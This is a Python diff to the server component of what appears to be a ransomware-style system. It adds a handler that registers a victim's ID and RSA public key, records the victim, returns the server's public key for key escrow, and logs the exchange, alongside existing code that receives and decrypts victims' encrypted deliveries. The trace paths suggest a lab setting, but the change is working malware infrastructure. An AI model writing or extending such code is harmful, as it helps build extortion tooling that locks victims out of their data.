@@ -1,12 +1,25 @@
 import socket
 from pathlib import Path
 
-from protocolo.mensajes import PUERTO, TIPO_CONFIRMACION, TIPO_ENTREGA, TIPO_ERROR, emitir, leer
+from Crypto.PublicKey import RSA
+
+from protocolo.mensajes import (
+    PUERTO,
+    TIPO_CONFIRMACION,
+    TIPO_ENTREGA,
+    TIPO_ERROR,
+    TIPO_REGISTRO,
+    TIPO_RESPUESTA,
+    emitir,
+    leer,
+)
 from protocolo.oaep import abrir
+from protocolo.registro import desempaquetar, empaquetar
 from servidor.claves import asegurar, par_cargado, privada
-from servidor.registro import guardados, guardar, incorporar
+from servidor.registro import anotar_victima, guardados, guardar, incorporar
 
 TRAZA = Path("/datos/traza-servidor/entrega")
+TRAZA_REGISTRO = Path("/datos/traza-servidor/registro")
 REINICIO = Path("/datos/traza-servidor/reinicio")
 CIERRE = Path("/datos/control/cerrar")
 
@@ -17,9 +30,25 @@ def _trazar(id_v, resultado, detalle):
         salida.write(f"entrega {id_v.hex()} {resultado} {detalle}\n")
 
 
+def _trazar_registro(id_v, detalle):
+    TRAZA_REGISTRO.parent.mkdir(parents=True, exist_ok=True)
+    with TRAZA_REGISTRO.open("a", encoding="utf-8") as salida:
+        salida.write(f"registro {id_v.hex()} ok {detalle}\n")
+
+
 def atender(conexion):
     with conexion:
         tipo, cuerpo = leer(conexion)
+        if tipo == TIPO_REGISTRO:
+            id_v, pk_v = desempaquetar(cuerpo)
+            clave = RSA.import_key(pk_v)
+            if clave.has_private() or clave.e != 65537 or clave.n.bit_length() != 2048:
+                raise ValueError("pkV")
+            nueva = anotar_victima(id_v, pk_v)
+            pk_s = par_cargado().publickey().export_key(format="DER", pkcs=8)
+            _trazar_registro(id_v, "asociada" if nueva else "misma")
+            conexion.sendall(emitir(TIPO_RESPUESTA, empaquetar(id_v, pk_s)))
+            return
         if tipo != TIPO_ENTREGA or len(cuerpo) < 16:
             return
         id_v, cifrado = cuerpo[:16], cuerpo[16:]
